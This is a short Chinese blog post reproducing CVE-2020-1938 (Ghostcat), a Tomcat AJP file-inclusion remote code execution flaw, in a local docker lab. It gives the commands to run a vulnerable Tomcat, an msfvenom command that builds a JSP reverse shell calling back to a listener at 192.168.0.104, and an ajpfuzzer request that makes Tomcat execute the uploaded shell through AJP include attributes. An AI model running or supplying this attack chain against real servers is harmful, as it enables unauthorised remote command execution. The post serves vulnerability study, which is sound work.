# CVE-2020-1938 Tomcat 文件包含 RCE 复现 - 雨九九 - 博客园

> 原文：[`www.cnblogs.com/Rain99-/p/12517660.html`](https://www.cnblogs.com/Rain99-/p/12517660.html)

目录

*   CVE-2020-1938 Tomcat 文件包含 RCE 复现
    *   docker 环境
    *   MSF 生成反弹马并监听
    *   复现
    *   参考

# CVE-2020-1938 Tomcat 文件包含 RCE 复现

## docker 环境

```
docker search tomcat-8.5.32
docker pull duonghuuphuc/tomcat-8.5.32
docker run -d -p 8080:8080 -p 8009:8009 --name ghostcat duonghuuphuc/tomcat-8.5.32
docker port ghostcat 
```

![](img/8a1f0e597d5e2d9c2a7d6cabe8ed9441.png)

## MSF 生成反弹马并监听

1.  生成 jspshell 为 shell.txt
    `msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.104 LPORT=999 -f raw > shell.txt`
2.  监听
    ![](img/3f700c73b2cf39a79d88c595f89311e8.png)

## 复现

1.  上传 shell.txt 至 ROOT
    ![](img/8fbd884ef289802c37cfb8026ed0a349.png)

2.  ajpfuzzer
    [`github.com/doyensec/ajpfuzzer`](https://github.com/doyensec/ajpfuzzer)

```
java -jar ajpfuzzer_v0.6.jar
connect 192.168.0.102 8009
forwardrequest 2 "HTTP/1.1" "/11.jsp" 192.168.0.102 192.168.0.102 porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request_uri:11.jsp","javax.servlet.include.path_info:shell.txt","javax.servlet.include.servlet_path:/" 
```

11.jsp 可以换为任意该 web 项目中没有的 jsp 文件，这样 tomcat 才会去调用 DefaultServlet
![](img/036405b26b3b8c392955c17d8f30395f.png)

shell 应该被执行了，但不知为什么一直建立不了 session

## 参考

[`mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&mid=2247485009&idx=1&sn=5f619c27ec994949f5fa69d41d2dee05&chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&mpshare=1&scene=23&srcid=&sharer_sharetime=1584439554350&sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd`](https://mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&mid=2247485009&idx=1&sn=5f619c27ec994949f5fa69d41d2dee05&chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&mpshare=1&scene=23&srcid=&sharer_sharetime=1584439554350&sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd)